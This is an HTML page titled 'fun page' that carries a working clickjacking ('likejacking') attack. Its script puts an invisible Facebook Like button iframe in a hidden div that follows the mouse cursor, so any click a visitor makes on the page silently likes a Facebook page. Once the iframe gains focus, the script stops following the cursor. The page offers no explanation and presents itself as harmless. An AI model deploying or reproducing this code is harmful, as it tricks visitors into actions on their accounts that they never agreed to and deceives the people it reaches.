<!DOCTYPE html>
<html>
<head><title>fun page</title></head>
<body>
<script>
var interval;
window.onload = function() {
    interval = setInterval("updateActiveElement();", 50);
};
function updateActiveElement() {
    if ($(document.activeElement).attr('id') == "fbframe") {
        clearInterval(interval);
        iflag = 1;
    }
}
</script>
<div id="icontainer" style="overflow:hidden;width:10px;height:12px;position:absolute;filter:alpha(opacity=0);opacity:0.0;">
<iframe id="fbframe" name="fbframe" scrolling="no" src="http://www.facebook.com/plugins/like.php?href=http://www.facebook.com/somepage&amp;layout=standard&amp;action=like"></iframe>
</div>
<script>
var iflag = 0;
var icontainer = document.getElementById('icontainer');
function mouseFollower(e) {
    icontainer.style.top = (e.pageY - 5) + 'px';
    icontainer.style.left = (e.pageX - 5) + 'px';
}
document.onmousemove = function(e) {
    if (iflag == 0) { mouseFollower(e); }
};
</script>
</body>
</html>
